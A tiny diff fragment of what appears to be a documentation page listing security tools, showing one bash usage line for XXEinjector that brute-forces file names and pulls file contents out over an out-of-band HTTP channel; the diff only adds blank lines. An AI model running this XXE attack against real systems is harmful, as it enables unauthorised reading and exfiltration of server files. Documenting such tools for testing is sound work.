@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:24:45.357412+00:00'
 ```bash
 ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc
 ```
+
+
